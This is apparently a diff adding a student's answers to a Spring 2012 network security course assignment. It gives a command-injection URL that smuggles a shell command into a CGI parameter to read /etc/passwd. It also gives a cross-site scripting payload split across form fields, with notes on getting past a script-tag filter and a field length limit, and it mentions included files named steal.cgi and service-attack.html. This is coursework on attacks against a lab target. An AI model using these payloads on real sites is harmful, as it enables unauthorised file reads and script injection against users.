@@ -1,0 +1,30 @@
+CIS551, Computing and Network Security, Spring 2012
+Chris Imbriano and Dustin Zelle
+April 24, 2011
+
+A)
+  1)
+    http://<IP>/cgi-bin/web-ls.cgi?dir=html%20%3E%20%2Fdev%2Fnull%3Bcat%20%2Fetc%2Fpasswd
+  
+  2)
+    web-ls-safe.cgi is included
+
+B) 
+    Name: <script type="text/javascript">/*
+    Street 1: */alert/*
+    Street 2: */("Javascript successfully injected!");/*
+    City: */</script >
+    State:
+    Zip Code:
+
+    * The text "<script>" and "</script>" are removed server-side to protect against a XSS attack;
+      we instead use "<script type="text/javascript>" and "</script >".
+    * There is a 45 character limit per field client side; we separated the attack across multiple
+      fields.
+    * Fields have "<br>" tags inserted between them on the confirmation page; we used javascript
+      comments so the javascript engine would ignore them.
+
+C)
+  1) service-attack.html and steal.cgi are included.
+
+  2) 
